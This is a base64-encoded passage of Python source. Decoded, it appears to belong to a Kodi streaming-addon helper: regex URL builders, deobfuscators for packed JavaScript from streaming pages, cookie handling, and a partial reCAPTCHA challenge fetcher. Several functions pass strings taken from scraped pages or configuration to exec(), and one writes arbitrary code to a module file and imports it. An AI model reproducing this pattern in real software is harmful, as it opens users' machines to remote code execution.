ZmluYWxfdXJsLnJlcGxhY2UoJyAnLCAnJTIwJykNCiAgICByZXR1cm4gZmluYWxfdXJsDQoNCg0KZGVmIHJlX21lKGRhdGEsIHJlX3BhdHRlbik6DQogICAgbWF0Y2ggPSAnJw0KICAgIG0gPSByZS5zZWFyY2gocmVfcGF0dGVuLCBkYXRhKQ0KICAgIGlmIG0gIT0gTm9uZToNCiAgICAgICAgbWF0Y2ggPSBtLmdyb3VwKDEpDQogICAgZWxzZToNCiAgICAgICAgbWF0Y2ggPSAnJw0KICAgIHJldHVybiBtYXRjaA0KDQoNCmRlZiByZXZpc3RfZGFnKHBhZ2VfZGF0YSk6DQogICAgZmluYWxfdXJsID0gJycNCiAgICBpZiAnMTI3LjAuMC4xJyBpbiBwYWdlX2RhdGE6DQogICAgICAgIGZpbmFsX3VybCA9IHJlX21lKHBhZ2VfZGF0YSwgJyZ2ZXJfdD0oW14mXSspJicpICsgJyBsaXZlPXRydWUgdGltZW91dD0xNSBwbGF5cGF0aD0nICsgcmVfbWUocGFnZV9kYXRhLCAnXFw/eT0oW2EtekEtWjAtOS1fXFwuQF0rKScpDQoNCiAgICBpZiByZV9tZShwYWdlX2RhdGEsICd0b2tlbj0oW14mXSspJicpICE9ICcnOg0KICAgICAgICBmaW5hbF91cmwgPSBmaW5hbF91cmwgKyAnP3Rva2VuPScgKyByZV9tZShwYWdlX2RhdGEsICd0b2tlbj0oW14mXSspJicpDQogICAgZWxpZiByZV9tZShwYWdlX2RhdGEsICd3bXNBdXRoU2lnbiUzRChbXiUmXSspJykgIT0gJyc6DQogICAgICAgIGZpbmFsX3VybCA9IHJlX21lKHBhZ2VfZGF0YSwgJyZ2ZXJfdD0oW14mXSspJicpICsgJz93bXNBdXRoU2lnbj0nICsgcmVfbWUocGFnZV9kYXRhLCAnd21zQXV0aFNpZ24lM0QoW14lJl0rKScpICsgJz09L21wNDonICsgcmVfbWUocGFnZV9kYXRhLCAnXFw/eT0oW14mXSspJicpDQogICAgZWxzZToNCiAgICAgICAgZmluYWxfdXJsID0gcmVfbWUocGFnZV9kYXRhLCAnSFJFRj0iKFteIl0rKSInKQ0KDQogICAgaWYgJ2RhZzEuYXN4JyBpbiBmaW5hbF91cmw6DQogICAgICAgIHJldHVybiBnZXRfZGFnX3VybChmaW5hbF91cmwpDQoNCiAgICBpZiAnZGV2aW5saXZlZnMuZnBsaXZlLm5ldCcgbm90IGluIGZpbmFsX3VybDoNCiAgICAgICAgZmluYWxfdXJsID0gZmluYWxfdXJsLnJlcGxhY2UoJ2RldmlubGl2ZScsICdmbGl2ZScpDQogICAgaWYgJ3Blcm1saXZlZnMuZnBsaXZlLm5ldCcgbm90IGluIGZpbmFsX3VybDoNCiAgICAgICAgZmluYWxfdXJsID0gZmluYWxfdXJsLnJlcGxhY2UoJ3Blcm1saXZlJywgJ2ZsaXZlJykNCiAgICByZXR1cm4gZmluYWxfdXJsDQoNCg0KZGVmIGdldF91bndpc2UoIHN0cl9ldmFsKToNCiAgICBwYWdlX3ZhbHVlPSIiDQogICAgdHJ5Og0KICAgICAgICBzcz0idyxpLHMsZT0oIitzdHJfZXZhbCsnKScNCiAgICAgICAgZXhlYyAoc3MpDQogICAgICAgIHBhZ2VfdmFsdWU9dW53aXNlX2Z1bmModyxpLHMsZSkNCiAgICBleGNlcHQ6IHRyYWNlYmFjay5wcmludF9leGMoZmlsZT1zeXMuc3Rkb3V0KQ0KICAgICNwcmludCAndW5wYWNrZWQnLHBhZ2VfdmFsdWUNCiAgICByZXR1cm4gcGFnZV92YWx1ZQ0KDQoNCmRlZiB1bndpc2VfZnVuYyggdywgaSwgcywgZSk6DQogICAgbElsbCA9IDA7DQogICAgbGwxSSA9IDA7DQogICAgSWwxbCA9IDA7DQogICAgbGwxbCA9IFtdOw0KICAgIGwxbEkgPSBbXTsNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICBpZiAobElsbCA8IDUpOg0KICAgICAgICAgICAgbDFsSS5hcHBlbmQod1tsSWxsXSkNCiAgICAgICAgZWxpZiAobElsbCA8IGxlbih3KSk6DQogICAgICAgICAgICBsbDFsLmFwcGVuZCh3W2xJbGxdKTsNCiAgICAgICAgbElsbCs9MTsNCiAgICAgICAgaWYgKGxsMUkgPCA1KToNCiAgICAgICAgICAgIGwxbEkuYXBwZW5kKGlbbGwxSV0pDQogICAgICAgIGVsaWYgKGxsMUkgPCBsZW4oaSkpOg0KICAgICAgICAgICAgbGwxbC5hcHBlbmQoaVtsbDFJXSkNCiAgICAgICAgbGwxSSs9MTsNCiAgICAgICAgaWYgKElsMWwgPCA1KToNCiAgICAgICAgICAgIGwxbEkuYXBwZW5kKHNbSWwxbF0pDQogICAgICAgIGVsaWYgKElsMWwgPCBsZW4ocykpOg0KICAgICAgICAgICAgbGwxbC5hcHBlbmQoc1tJbDFsXSk7DQogICAgICAgIElsMWwrPTE7DQogICAgICAgIGlmIChsZW4odykgKyBsZW4oaSkgKyBsZW4ocykgKyBsZW4oZSkgPT0gbGVuKGxsMWwpICsgbGVuKGwxbEkpICsgbGVuKGUpKToNCiAgICAgICAgICAgIGJyZWFrOw0KDQogICAgbEkxbCA9ICcnLmpvaW4obGwxbCkjLmpvaW4oJycpOw0KICAgIEkxbEkgPSAnJy5qb2luKGwxbEkpIy5qb2luKCcnKTsNCiAgICBsbDFJID0gMDsNCiAgICBsMWxsID0gW107DQogICAgZm9yIGxJbGwgaW4gcmFuZ2UoMCxsZW4obGwxbCksMik6DQogICAgICAgICNwcmludCAnYXJyYXkgaScsbElsbCxsZW4obGwxbCkNCiAgICAgICAgbGwxMSA9IC0xOw0KICAgICAgICBpZiAoIG9yZChJMWxJW2xsMUldKSAlIDIpOg0KICAgICAgICAgICAgbGwxMSA9IDE7DQogICAgICAgICNwcmludCAndmFsIGlzICcsIGxJMWxbbElsbDogbElsbCsyXQ0KICAgICAgICBsMWxsLmFwcGVuZChjaHIoICAgIGludChsSTFsW2xJbGw6IGxJbGwrMl0sIDM2KSAtIGxsMTEpKTsNCiAgICAgICAgbGwxSSs9MTsNCiAgICAgICAgaWYgKGxsMUkgPj0gbGVuKGwxbEkpKToNCiAgICAgICAgICAgIGxsMUkgPSAwOw0KICAgIHJldD0nJy5qb2luKGwxbGwpDQogICAgaWYgJ2V2YWwoZnVuY3Rpb24odyxpLHMsZSknIGluIHJldDoNCiMgICAgICAgIHByaW50ICdTVElMTCBHT2luZycNCiAgICAgICAgcmV0PXJlLmNvbXBpbGUoJ2V2YWxcKGZ1bmN0aW9uXCh3LGkscyxlXCkuKn1cKCguKj8pXCknKS5maW5kYWxsKHJldClbMF0NCiAgICAgICAgcmV0dXJuIGdldF91bndpc2UocmV0KQ0KICAgIGVsc2U6DQojICAgICAgICBwcmludCAnRklOSVNIRUQnDQogICAgICAgIHJldHVybiByZXQNCg0KDQpkZWYgZ2V0X3VucGFja2VkKCBwYWdlX3ZhbHVlLCByZWdleF9mb3JfdGV4dD0nJywgaXRlcmF0aW9ucz0xLCB0b3RhbF9pdGVyYXRpb249MSk6DQogICAgdHJ5Og0KICAgICAgICByZWdfZGF0YT1Ob25lDQogICAgICAgIGlmIHBhZ2VfdmFsdWUuc3RhcnRzd2l0aCgiaHR0cCIpOg0KICAgICAgICAgICAgcGFnZV92YWx1ZT0gZ2V0VXJsKHBhZ2VfdmFsdWUpDQojICAgICAgICBwcmludCAncGFnZV92YWx1ZScscGFnZV92YWx1ZQ0KICAgICAgICBpZiByZWdleF9mb3JfdGV4dCBhbmQgbGVuKHJlZ2V4X2Zvcl90ZXh0KT4wOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHBhZ2VfdmFsdWU9cmUuY29tcGlsZShyZWdleF9mb3JfdGV4dCkuZmluZGFsbChwYWdlX3ZhbHVlKVswXSAjZ2V0IHRoZSBqcyB2YXJpYWJsZQ0KICAgICAgICAgICAgZXhjZXB0OiByZXR1cm4gJ05PVFBBQ0tFRCcNCg0KICAgICAgICBwYWdlX3ZhbHVlPXVucGFjayhwYWdlX3ZhbHVlLGl0ZXJhdGlvbnMsdG90YWxfaXRlcmF0aW9uKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFnZV92YWx1ZT0nVU5QQUNLRURGQUlMRUQnDQogICAgICAgIHRyYWNlYmFjay5wcmludF9leGMoZmlsZT1zeXMuc3Rkb3V0KQ0KIyAgICBwcmludCAndW5wYWNrZWQnLHBhZ2VfdmFsdWUNCiAgICBpZiAnc2F2MWxpdmUudHYnIGluIHBhZ2VfdmFsdWU6DQogICAgICAgIHBhZ2VfdmFsdWU9cGFnZV92YWx1ZS5yZXBsYWNlKCdzYXYxbGl2ZS50dicsJ3Nhd2xpdmUudHYnKSAjcXVpY2sgZml4IHNvbWUgYnVnIHNvbWV3aGVyZQ0KIyAgICAgICAgcHJpbnQgJ3NhdjEgdW5wYWNrZWQnLHBhZ2VfdmFsdWUNCiAgICByZXR1cm4gcGFnZV92YWx1ZQ0KDQoNCmRlZiB1bnBhY2soc0phdmFzY3JpcHQsaXRlcmF0aW9uPTEsIHRvdGFsaXRlcmF0aW9ucz0yICApOg0KIyAgICBwcmludCAnaXRlcmF0aW9uJyxpdGVyYXRpb24NCiAgICBpZiBzSmF2YXNjcmlwdC5zdGFydHN3aXRoKCd2YXIgXzB4Y2I4YT0nKToNCiAgICAgICAgYVNwbGl0PXNKYXZhc2NyaXB0LnNwbGl0KCd2YXIgXzB4Y2I4YT0nKQ0KICAgICAgICBzcz0ibXlhcnJheT0iK2FTcGxpdFsxXS5zcGxpdCgiZXZhbCgiKVswXQ0KICAgICAgICBleGVjKHNzKQ0KICAgICAgICBhMT02Mg0KICAgICAgICBjMT1pbnQoYVNwbGl0WzFdLnNwbGl0KCIsNjIsIilbMV0uc3BsaXQoJywnKVswXSkNCiAgICAgICAgcDE9bXlhcnJheVswXQ0KICAgICAgICBrMT1teWFycmF5WzNdDQogICAgICAgIHdpdGggb3BlbigndGVtcCBmaWxlJytzdHIoaXRlcmF0aW9uKSsnLmpzJywgIndiIikgYXMgZmlsZXdyaXRlcjoNCiAgICAgICAgICAgIGZpbGV3cml0ZXIud3JpdGUoc3RyKGsxKSkNCiAgICAgICAgI2FhPTEvMA0KICAgIGVsc2U6DQoNCiAgICAgICAgaWYgInJuIHB9KCciIGluIHNKYXZhc2NyaXB0Og0KICAgICAgICAgICAgYVNwbGl0ID0gc0phdmFzY3JpcHQuc3BsaXQoInJuIHB9KCciKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgYVNwbGl0ID0gc0phdmFzY3JpcHQuc3BsaXQoInJuIEF9KCciKQ0KIyAgICAgICAgcHJpbnQgYVNwbGl0DQoNCiAgICAgICAgcDEsYTEsYzEsazE9KCcnLCcwJywnMCcsJycpDQoNCiAgICAgICAgc3M9InAxLGExLGMxLGsxPSgnIithU3BsaXRbMV0uc3BsaXQoIi5zcGxpIilbMF0rJyknDQogICAgICAgIGV4ZWMoc3MpDQogICAgazE9azEuc3BsaXQoJ3wnKQ0KICAgIGFTcGxpdCA9IGFTcGxpdFsxXS5zcGxpdCgiKSknIikNCiMgICAgcHJpbnQgJyBwIGFycmF5IGlzICcsbGVuKGFTcGxpdCkNCiMgICBwcmludCBsZW4oYVNwbGl0ICkNCg0KICAgICNwPXN0cihhU3BsaXRbMF0rJykpJykjLnJlcGxhY2UoIlxcIiwiIikjLnJlcGxhY2UoJ1xcXFwnLCdcXCcpDQoNCiAgICAjcHJpbnQgYVNwbGl0WzFdDQogICAgI2FTcGxpdCA9IGFTcGxpdFsxXS5zcGxpdCgiLCIpDQogICAgI3ByaW50IGFTcGxpdFswXQ0KICAgICNhID0gaW50KGFTcGxpdFsxXSkNCiAgICAjYyA9IGludChhU3BsaXRbMl0pDQogICAgI2sgPSBhU3BsaXRbM10uc3BsaXQoIi4iKVswXS5yZXBsYWNlKCInIiwgJycpLnNwbGl0KCd8JykNCiAgICAjYT1pbnQoYSkNCiAgICAjYz1pbnQoYykNCg0KICAgICNwPXAucmVwbGFjZSgnXFwnLCAnJykNCiMgICAgcHJpbnQgJ3AgdmFsIGlzICcscFswOjEwMF0sJy4uLi4uLi4uLi4uLicscFstMTAwOl0sbGVuKHApDQojICAgIHByaW50ICdwMSB2YWwgaXMgJyxwMVswOjEwMF0sJy4uLi4uLi4uLi4uLicscDFbLTEwMDpdLGxlbihwMSkNCg0KICAgICNwcmludCBhLGExDQogICAgI3ByaW50IGMsYTENCiAgICAjcHJpbnQgJ2sgdmFsIGlzICcsa1stMTA6XSxsZW4oaykNCiMgICAgcHJpbnQgJ2sxIHZhbCBpcyAnLGsxWy0xMDpdLGxlbihrMSkNCiAgICBlID0gJycNCiAgICBkID0gJycjMzI4MjMNCg0KICAgICNzVW5wYWNrZWQgPSBzdHIoX191bnBhY2socCwgYSwgYywgaywgZSwgZCkpDQogICAgc1VucGFja2VkMSA9IHN0cihfX3VucGFjayhwMSwgYTEsIGMxLCBrMSwgZSwgZCxpdGVyYXRpb24pKQ0KDQogICAgI3ByaW50IHNVbnBhY2tlZFs6MjAwXSsnLi4uLicrc1VucGFja2VkWy0xMDA6XSwgbGVuKHNVbnBhY2tlZCkNCiMgICAgcHJpbnQgc1VucGFja2VkMVs6MjAwXSsnLi4uLicrc1VucGFja2VkMVstMTAwOl0sIGxlbihzVW5wYWNrZWQxKQ0KDQogICAgI2V4ZWMoJ3NVbnBhY2tlZDE9Iicrc1VucGFja2VkMSsnIicpDQogICAgaWYgaXRlcmF0aW9uPj10b3RhbGl0ZXJhdGlvbnM6DQojICAgICAgICBwcmludCAnZmluYWwgcmVzJyxzVW5wYWNrZWQxWzoyMDBdKycuLi4uJytzVW5wYWNrZWQxWy0xMDA6XSwgbGVuKHNVbnBhY2tlZDEpDQogICAgICAgIHJldHVybiBzVW5wYWNrZWQxIy5yZXBsYWNlKCdcXFxcJywgJ1xcJykNCiAgICBlbHNlOg0KIyAgICAgICAgcHJpbnQgJ2ZpbmFsIHJlcyBmb3IgdGhpcyBpdGVyYXRpb24gaXMnLGl0ZXJhdGlvbg0KICAgICAgICByZXR1cm4gdW5wYWNrKHNVbnBhY2tlZDEsaXRlcmF0aW9uKzEpIy5yZXBsYWNlKCdcXCcsICcnKSxpdGVyYXRpb24pIy5yZXBsYWNlKCdcXCcsICcnKTsjdW5wYWNrKHNVbnBhY2tlZC5yZXBsYWNlKCdcXCcsICcnKSkNCg0KDQpkZWYgX191bnBhY2socCwgYSwgYywgaywgZSwgZCwgaXRlcmF0aW9uLHY9MSk6DQoNCiAgICAjd2l0aCBvcGVuKCdiZWZvcmUgZmlsZScrc3RyKGl0ZXJhdGlvbikrJy5qcycsICJ3YiIpIGFzIGZpbGV3cml0ZXI6DQogICAgIyAgICBmaWxld3JpdGVyLndyaXRlKHN0cihwKSkNCiAgICB3aGlsZSAoYyA+PSAxKToNCiAgICAgICAgYyA9IGMgLTENCiAgICAgICAgaWYgKGtbY10pOg0KICAgICAgICAgICAgYWE9c3RyKF9faXRvYU5ldyhjLCBhKSkNCiAgICAgICAgICAgIGlmIHY9PTE6DQogICAgICAgICAgICAgICAgcD1yZS5zdWIoJ1xcYicgKyBhYSArJ1xcYicsIGtbY10sIHApIyBUSElTIElTIEJsb29keSBzbG93IQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBwPWZpbmRBbmRSZXBsYWNlV29yZChwLGFhLGtbY10pDQoNCiAgICAgICAgICAgICNwPWZpbmRBbmRSZXBsYWNlV29yZChwLGFhLGtbY10pDQoNCg0KICAgICN3aXRoIG9wZW4oJ2FmdGVyIGZpbGUnK3N0cihpdGVyYXRpb24pKycuanMnLCAid2IiKSBhcyBmaWxld3JpdGVyOg0KICAgICMgICAgZmlsZXdyaXRlci53cml0ZShzdHIocCkpDQogICAgcmV0dXJuIHANCg0KIw0KI2Z1bmN0aW9uIGVxdWFsYXZlbnQgdG8gcmUuc3ViKCdcXGInICsgYWEgKydcXGInLCBrW2NdLCBwKQ0KDQoNCmRlZiBmaW5kQW5kUmVwbGFjZVdvcmQoc291cmNlX3N0ciwgd29yZF90b19maW5kLHJlcGxhY2Vfd2l0aCk6DQogICAgc3BsaXRzPU5vbmUNCiAgICBzcGxpdHM9c291cmNlX3N0ci5zcGxpdCh3b3JkX3RvX2ZpbmQpDQogICAgaWYgbGVuKHNwbGl0cyk+MToNCiAgICAgICAgbmV3X3N0cmluZz1bXQ0KICAgICAgICBjdXJyZW50X2luZGV4PTANCiAgICAgICAgZm9yIGN1cnJlbnRfc3BsaXQgaW4gc3BsaXRzOg0KICAgICAgICAgICAgI3ByaW50ICdoZXJlJyxpDQogICAgICAgICAgICBuZXdfc3RyaW5nLmFwcGVuZChjdXJyZW50X3NwbGl0KQ0KICAgICAgICAgICAgdmFsPXdvcmRfdG9fZmluZCNieSBkZWZhdWx0IGFzc3VtZSBpdCB3YXMgd3JvbmcgdG8gc3BsaXQNCg0KICAgICAgICAgICAgI2lmIGl0cyBmaXJzdCBvbmUgYW5kIGl0ZW0gaXMgYmxhbmsgdGhlbiBjaGVjayBuZXh0IGl0ZW0gaXMgdmFsaWQgb3Igbm90DQogICAgICAgICAgICBpZiBjdXJyZW50X2luZGV4PT1sZW4oc3BsaXRzKS0xOg0KICAgICAgICAgICAgICAgIHZhbD0nJyAjIGxhc3Qgb25lIG5vdGhpbmcgdG8gYXBwZW5kIG5vcm1hbGx5DQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGlmIGxlbihjdXJyZW50X3NwbGl0KT09MDogI2lmIGJsYW5rIGNoZWNrIG5leHQgb25lIHdpdGggY3VycmVudCBzcGxpdCB2YWx1ZQ0KICAgICAgICAgICAgICAgICAgICBpZiAoIGxlbihzcGxpdHNbY3VycmVudF9pbmRleCsxXSk9PTAgYW5kIHdvcmRfdG9fZmluZFswXS5sb3dlcigpIG5vdCBpbiAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwXycpIG9yIChsZW4oc3BsaXRzW2N1cnJlbnRfaW5kZXgrMV0pPjAgIGFuZCBzcGxpdHNbY3VycmVudF9pbmRleCsxXVswXS5sb3dlcigpIG5vdCBpbiAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwXycpOiMgZmlyc3QganVzdCBqdXN0IGNoZWNrIG5leHQNCiAgICAgICAgICAgICAgICAgICAgICAgIHZhbD1yZXBsYWNlX3dpdGgNCiAgICAgICAgICAgICAgICAjbm90IGJsYW5rLCB0aGVuIGNoZWNrIGN1cnJlbnQgZW5kdmFsdWUgYW5kIG5leHQgZmlyc3QgdmFsdWUNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBpZiAoc3BsaXRzW2N1cnJlbnRfaW5kZXhdWy0xXS5sb3dlcigpIG5vdCBpbiAnYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwXycpIGFuZCAoKCBsZW4oc3BsaXRzW2N1cnJlbnRfaW5kZXgrMV0pPT0wIGFuZCB3b3JkX3RvX2ZpbmRbMF0ubG93ZXIoKSBub3QgaW4gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MTIzNDU2Nzg5MF8nKSBvciAobGVuKHNwbGl0c1tjdXJyZW50X2luZGV4KzFdKT4wICBhbmQgc3BsaXRzW2N1cnJlbnRfaW5kZXgrMV1bMF0ubG93ZXIoKSBub3QgaW4gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MTIzNDU2Nzg5MF8nKSk6IyBmaXJzdCBqdXN0IGp1c3QgY2hlY2sgbmV4dA0KICAgICAgICAgICAgICAgICAgICAgICAgdmFsPXJlcGxhY2Vfd2l0aA0KDQogICAgICAgICAgICBuZXdfc3RyaW5nLmFwcGVuZCh2YWwpDQogICAgICAgICAgICBjdXJyZW50X2luZGV4Kz0xDQogICAgICAgICNhYWFhPTEvMA0KICAgICAgICBzb3VyY2Vfc3RyPScnLmpvaW4obmV3X3N0cmluZykNCiAgICByZXR1cm4gc291cmNlX3N0cg0KDQoNCmRlZiBfX2l0b2EobnVtLCByYWRpeCk6DQojICAgIHByaW50ICdudW0gcmVkJyxudW0sIHJhZGl4DQogICAgcmVzdWx0ID0gIiINCiAgICBpZiBudW09PTA6IHJldHVybiAnMCcNCiAgICB3aGlsZSBudW0gPiAwOg0KICAgICAgICByZXN1bHQgPSAiMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6IltudW0gJSByYWRpeF0gKyByZXN1bHQNCiAgICAgICAgbnVtIC89IHJhZGl4DQogICAgcmV0dXJuIHJlc3VsdA0KDQoNCmRlZiBfX2l0b2FOZXcoY2MsIGEpOg0KICAgIGFhPSIiIGlmIGNjIDwgYSBlbHNlIF9faXRvYU5ldyhpbnQoY2MgLyBhKSxhKQ0KICAgIGNjID0gKGNjICUgYSkNCiAgICBiYj1jaHIoY2MgKyAyOSkgaWYgY2M+IDM1IGVsc2Ugc3RyKF9faXRvYShjYywzNikpDQogICAgcmV0dXJuIGFhK2JiDQoNCg0KZGVmIGdldENvb2tpZXNTdHJpbmcoY29va2llSmFyKToNCiAgICB0cnk6DQogICAgICAgIGNvb2tpZVN0cmluZz0iIg0KICAgICAgICBmb3IgaW5kZXgsIGNvb2tpZSBpbiBlbnVtZXJhdGUoY29va2llSmFyKToNCiAgICAgICAgICAgIGNvb2tpZVN0cmluZys9Y29va2llLm5hbWUgKyAiPSIgKyBjb29raWUudmFsdWUgKyI7Ig0KICAgIGV4Y2VwdDogcGFzcw0KICAgICNwcmludCAnY29va2llU3RyaW5nJyxjb29raWVTdHJpbmcNCiAgICByZXR1cm4gY29va2llU3RyaW5nDQoNCg0KZGVmIHNhdmVDb29raWVKYXIoY29va2llSmFyLENPT0tJRUZJTEUpOg0KICAgIHRyeToNCiAgICAgICAgY29tcGxldGVfcGF0aD1vcy5wYXRoLmpvaW4ocHJvZmlsZSxDT09LSUVGSUxFKQ0KICAgICAgICBjb29raWVKYXIuc2F2ZShjb21wbGV0ZV9wYXRoLGlnbm9yZV9kaXNjYXJkPVRydWUpDQogICAgZXhjZXB0OiBwYXNzDQoNCg0KZGVmIGdldENvb2tpZUphcihDT09LSUVGSUxFKToNCg0KICAgIGNvb2tpZUphcj1Ob25lDQogICAgaWYgQ09PS0lFRklMRToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgY29tcGxldGVfcGF0aD1vcy5wYXRoLmpvaW4ocHJvZmlsZSxDT09LSUVGSUxFKQ0KICAgICAgICAgICAgY29va2llSmFyID0gY29va2llbGliLkxXUENvb2tpZUphcigpDQogICAgICAgICAgICBjb29raWVKYXIubG9hZChjb21wbGV0ZV9wYXRoLGlnbm9yZV9kaXNjYXJkPVRydWUpDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIGNvb2tpZUphcj1Ob25lDQoNCiAgICBpZiBub3QgY29va2llSmFyOg0KICAgICAgICBjb29raWVKYXIgPSBjb29raWVsaWIuTFdQQ29va2llSmFyKCkNCg0KICAgIHJldHVybiBjb29raWVKYXINCg0KDQpkZWYgZG9FdmFsKGZ1bl9jYWxsLHBhZ2VfZGF0YSxDb29raWVfSmFyLG0pOg0KICAgIHJldF92YWw9JycNCiAgICAjcHJpbnQgZnVuX2NhbGwNCiAgICBpZiBmdW5jdGlvbnNfZGlyIG5vdCBpbiBzeXMucGF0aDoNCiAgICAgICAgc3lzLnBhdGguYXBwZW5kKGZ1bmN0aW9uc19kaXIpDQoNCiMgICAgcHJpbnQgZnVuX2NhbGwNCiAgICB0cnk6DQogICAgICAgIHB5X2ZpbGU9J2ltcG9ydCAnK2Z1bl9jYWxsLnNwbGl0KCcuJylbMF0NCiMgICAgICAgIHByaW50IHB5X2ZpbGUsc3lzLnBhdGgNCiAgICAgICAgZXhlYyggcHlfZmlsZSkNCiMgICAgICAgIHByaW50ICdkb25lJw0KICAgIGV4Y2VwdDoNCiAgICAgICAgI3ByaW50ICdlcnJvciBpbiBpbXBvcnQnDQogICAgICAgIHRyYWNlYmFjay5wcmludF9leGMoZmlsZT1zeXMuc3Rkb3V0KQ0KIyAgICBwcmludCAncmV0X3ZhbD0nK2Z1bl9jYWxsDQogICAgZXhlYyAoJ3JldF92YWw9JytmdW5fY2FsbCkNCiMgICAgcHJpbnQgcmV0X3ZhbA0KICAgICNleGVjKCdyZXRfdmFsPTErMScpDQogICAgdHJ5Og0KICAgICAgICByZXR1cm4gc3RyKHJldF92YWwpDQogICAgZXhjZXB0OiByZXR1cm4gcmV0X3ZhbA0KDQoNCmRlZiBkb0V2YWxGdW5jdGlvbihmdW5fY2FsbCxwYWdlX2RhdGEsQ29va2llX0phcixtKToNCiMgICAgcHJpbnQgJ2RvRXZhbEZ1bmN0aW9uJw0KICAgIHJldF92YWw9JycNCiAgICBpZiBmdW5jdGlvbnNfZGlyIG5vdCBpbiBzeXMucGF0aDoNCiAgICAgICAgc3lzLnBhdGguYXBwZW5kKGZ1bmN0aW9uc19kaXIpDQogICAgZj1vcGVuKGZ1bmN0aW9uc19kaXIrIi9MU1Byb2R5bmFtaWNDb2RlLnB5IiwidyIpDQogICAgZi53cml0ZShmdW5fY2FsbCk7DQogICAgZi5jbG9zZSgpDQogICAgaW1wb3J0IExTUHJvZHluYW1pY0NvZGUNCiAgICByZXRfdmFsPUxTUHJvZHluYW1pY0NvZGUuR2V0TFNQcm9EYXRhKHBhZ2VfZGF0YSxDb29raWVfSmFyLG0pDQogICAgdHJ5Og0KICAgICAgICByZXR1cm4gc3RyKHJldF92YWwpDQogICAgZXhjZXB0OiByZXR1cm4gcmV0X3ZhbA0KDQoNCmRlZiBnZXRHb29nbGVSZWNhcHRjaGFSZXNwb25zZShjYXB0Y2hha2V5LCBjaix0eXBlPTEpOiAjMSBmb3IgZ2V0LCAyIGZvciBwb3N0LCAzIGZvciByYXdwb3N0DQojICAgICNoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IHJ2OjE0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQuMC4xJyldDQojICAgIGh0bWxfdGV4dD1nZXRVcmwodXJsLG5vcmVkaXI9VHJ1ZSwgY29va2llSmFyPWNqLGhlYWRlcnM9aGVhZGVycykNCiAjICAgcHJpbnQgJ2h0bWxfdGV4dCcsaHRtbF90ZXh0DQogICAgcmVjYXBDaGFsbGVuZ2U9IiINCiAgICBzb2x1dGlvbj0iIg0KIyAgICBjYXBfcmVnPSJyZWNhcC4qP1w/az0oLio/KVwiIiAgICANCiMgICAgbWF0Y2ggPXJlLmZpbmRhbGwoY2FwX3JlZywgaHRtbF90ZXh0KQ0KICAgIA0KICAgICAgICANCiMgICAgcHJpbnQgJ21hdGNoJyxtYXRjaA0KICAgIGNhcHRjaGE9RmFsc2UNCiAgICBjYXB0Y2hhX3JlbG9hZF9yZXNwb25zZV9jaGFsbD1Ob25lDQogICAgc29sdXRpb249Tm9uZQ0KICAgIGlmIGxlbihjYXB0Y2hha2V5KT4wOiAjbmV3IHNoaW55IGNhcHRjaGEhDQogICAgICAgIGNhcHRjaGFfdXJsPWNhcHRjaGFrZXkNCiAgICAgICAgaWYgbm90IGNhcHRjaGFfdXJsLnN0YXJ0c3dpdGgoJ2h0dHAnKToNCiAgICAgICAgICAgIGNhcHRjaGFfdXJsPSdodHRwOi8vd3d3Lmdvb2dsZS5jb20vcmVjYXB0Y2hhL2FwaS9jaGFsbGVuZ2U/az0nK2NhcHRjaGFfdXJsKycmYWpheD0xJw0KIyAgICAgICAgcHJpbnQgJ2NhcHRjaGFfdXJsJyxjYXB0Y2hhX3VybA0KICAgICAgICBjYXB0Y2hhPVRydWUNCg0KICAgICAgICBjYXBfY2hhbGxfcmVnPSdjaGFsbGVuZ2UuKj9cJyguKj8pXCcnDQogICAgICAgIGNhcF9pbWFnZV9yZWc9J1wnKC4qPylcJycNCiAgICAgICAgY2FwdGNoYV9zY3JpcHQ9Z2V0VXJsKGNhcHRjaGFfdXJsLGNvb2tpZUphcj1jaikNCiAgICAgICAgcmVjYXBDaGFsbGVuZ2U9cmUuZmluZGFsbChjYXBfY2hhbGxfcmVnLCBjYXB0Y2hhX3NjcmlwdClbMF0NCiAgICAgICAgY2FwdGNoYV9yZWxvYWQ9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS9yZWNhcHRjaGEvYXBpL3JlbG9hZD9jPSc7DQogICAgICAgIGNhcHRjaGFfaz1jYXB0Y2hhX3VybC5zcGxpdCgnaz0nKVsxXQ0KICAgICAgICBjYXB0Y2hhX3JlbG9hZCs9cmVjYXBDaGFsbGVuZ2UrJyZrPScrY2FwdGNoYV9rKycmcmVhc29uPWkmdHlwZT1pbWFnZSZsYW5nPWVuJw0KICAgICAgICBjYXB0Y2hhX3JlbG9hZF9qcz1nZXRVcmwoY2FwdGNoYV9yZWxvYWQsY29va2llSmFyPWNqKQ0KICAgICAgICBjYXB0Y2hhX3JlbG9hZF9yZXNwb25zZV9jaGFsbD1yZS5maW5kYWxsKGNhcF9pbWFnZV9yZWcsIGNhcHRjaGFfcmVsb2FkX2pzKVswXQ0KICAgICAgICBjYXB0Y2hhX2ltYWdlX3VybD0naHR0cDovL3d3dy5nb29nbGUuY29tL3JlY2FwdGNoYS9hcGkvaW1hZ2U/Yz0nK2NhcHRjaGFfcmVsb2FkX3Jlc3BvbnNlX2NoYWxsDQogICAgICAgIGlmIG5vdCBjYXB0Y2hhX2ltYWdlX3VybC5zdGFydHN3aXRoKCJodHRwIik6DQogICAgICAgICAg